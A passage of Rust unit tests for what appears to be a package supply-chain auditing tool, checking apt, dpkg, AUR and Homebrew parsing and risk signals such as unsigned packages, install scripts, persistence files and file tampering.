        assert!(app.direct, "explicit ⇒ direct/root");
        assert!(!lib.direct);
        assert_eq!(app.resolved_url.as_deref(), Some("https://github.com/o/app"));
        // `lib` is a real dep edge; `libfoo.so` dropped, `glibc` not installed → dropped.
        assert_eq!(lib.parents, vec![("app".to_string(), "1.2-1".to_string())]);
        // unsigned (High) + install-script (Info) on app; lib is signed/clean.
        let al: Vec<&str> = signals["app"].iter().map(|s| s.label.as_str()).collect();
        assert!(al.contains(&"unsigned"));
        assert!(al.iter().any(|l| l.contains("install-script")));
        assert!(!signals.contains_key("lib"));
    }

    #[test]
    fn apt_dep_names_parses() {
        assert_eq!(
            apt_dep_names("base-files (>= 2.1.12), debianutils (>= 5.6-0.1)"),
            vec!["base-files", "debianutils"]
        );
        // Alternatives take the first; `:any` qualifier stripped.
        assert_eq!(apt_dep_names("libc6 (>= 2.34) | libc6-udeb, perl:any"), vec!["libc6", "perl"]);
        assert!(apt_dep_names("").is_empty());
    }

    #[test]
    fn apt_community_component_classifies() {
        // Ubuntu community/non-free + Debian non-free sections flag; the curated
        // `main` (and a third-party PPA's own `main`) do not.
        for c in ["universe", "multiverse", "restricted", "contrib", "non-free", "non-free-firmware"]
        {
            assert!(is_community_component(c), "{c} should flag");
        }
        assert!(!is_community_component("main"));
        assert!(!is_community_component(""));
    }

    #[test]
    fn persistence_signals_classify() {
        let setuid: std::collections::HashSet<String> =
            ["/usr/bin/sudo".to_string()].into_iter().collect();
        let files = vec![
            "/usr/lib/systemd/system/foo.service".to_string(),
            "/etc/cron.d/foo".to_string(),
            "/etc/pam.d/foo".to_string(),
            "/usr/bin/sudo".to_string(),
            "/usr/share/doc/foo/README".to_string(),
        ];
        let labels: Vec<String> =
            persistence_signals(&files, &setuid).into_iter().map(|s| s.label).collect();
        assert!(labels.iter().any(|l| l.starts_with("installs-service")));
        assert!(labels.iter().any(|l| l.starts_with("installs-scheduled-task")));
        assert!(labels.iter().any(|l| l.starts_with("modifies-auth")));
        assert!(labels.contains(&"setuid-binary (sudo)".to_string()));
        // cron.deny / a plain doc file must not trip cron or the others.
        let quiet = vec!["/etc/cron.deny".to_string(), "/usr/bin/plain".to_string()];
        assert!(persistence_signals(&quiet, &setuid).is_empty());
    }

    #[test]
    fn dpkg_verify_flags_content_tamper() {
        // md5 (index 2) failed on a normal file → tamper.
        assert!(dpkg_line_is_tamper("??5??????   /usr/bin/bar"));
        // Same mismatch but a conffile (`c`) → expected admin edit, not tamper.
        assert!(!dpkg_line_is_tamper("??5?????? c /etc/foo.conf"));
        // Missing file / all-checks-pass / empty → not a content mismatch.
        assert!(!dpkg_line_is_tamper("missing     /usr/bin/gone"));
        assert!(!dpkg_line_is_tamper("??????????  /usr/bin/ok"));
        assert!(!dpkg_line_is_tamper(""));
    }

    #[test]
    fn apt_graph_builds_edges_and_direct() {
        let dpkg = "app\t1.0\tlib (>= 1)\t\thttps://github.com/o/app\nlib\t0.9\t\t\t\n";
        let manual: std::collections::HashSet<String> = ["app".to_string()].into_iter().collect();
        let deps = apt_graph(dpkg, &manual);
        assert_eq!(deps.len(), 2);
        let app = deps.iter().find(|d| d.name == "app").unwrap();
        let lib = deps.iter().find(|d| d.name == "lib").unwrap();
        assert!(app.direct, "in showmanual ⇒ direct");
        assert!(!lib.direct);
        assert_eq!(app.resolved_url.as_deref(), Some("https://github.com/o/app"));
        assert_eq!(lib.parents, vec![("app".to_string(), "1.0".to_string())]);
    }

    #[test]
    fn aur_foreign_signals() {
        // Not in AUR (manual install) → just foreign-package.
        let none = foreign_signals(None);
        assert_eq!(none.len(), 1);
        assert!(none[0].label.starts_with("foreign-package"));

        // Orphaned + out-of-date + unpopular AUR package → all three on top.
        let bad = AurPkg { name: "x".into(), maintainer: None, out_of_date: Some(1), num_votes: Some(3) };
        let sigs = foreign_signals(Some(&bad));
        let labels: Vec<&str> = sigs.iter().map(|s| s.label.as_str()).collect();
        assert!(labels.iter().any(|l| l.contains("aur-orphaned")));
        assert!(labels.iter().any(|l| l.contains("aur-out-of-date")));
        assert!(labels.iter().any(|l| l.contains("aur-unpopular")));

        // Healthy AUR package → foreign-package only (maintained, popular, current).
        let good = AurPkg { name: "y".into(), maintainer: Some("dev".into()), out_of_date: None, num_votes: Some(500) };
        assert_eq!(foreign_signals(Some(&good)).len(), 1);
    }

    #[test]
    fn aur_rpc_response_parses() {
        let json = r#"{"resultcount":1,"results":[
          {"Name":"yay","Maintainer":"jguer","OutOfDate":null,"NumVotes":2641,"Popularity":50.3}]}"#;
        let r: AurResp = serde_json::from_str(json).unwrap();
        assert_eq!(r.results.len(), 1);
        assert_eq!(r.results[0].maintainer.as_deref(), Some("jguer"));
        assert_eq!(r.results[0].num_votes, Some(2641));
        assert!(r.results[0].out_of_date.is_none());
    }

    #[test]
    fn annotate_merges_signals_onto_tree() {
        use crate::tree;
        let json = br#"{
          "formulae": [
            { "name": "app", "tap": "sn0walice/x", "installed": [
                { "version": "1.0.0", "installed_on_request": true, "runtime_dependencies": [] } ] }
          ]
        }"#;
        let remote = HashMap::from([("sn0walice/x".to_string(), "https://github.com/o/x".to_string())]);
        let Parsed { deps, signals, third_party, .. } = analyze(json, &remote).unwrap();
        assert_eq!(third_party, vec![("app".to_string(), false)], "flagged for recipe analysis");
        let mut forest = tree::build("brew", &["brew".to_string()], &deps, None);
        annotate(&mut forest, &signals);
        let app = &forest.roots[0];
        assert_eq!(app.severity, Some(Severity::Medium));
        assert_eq!(app.risk, Some(30));
        assert!(app.signals.iter().any(|s| s.contains("third-party-tap")));
    }
}
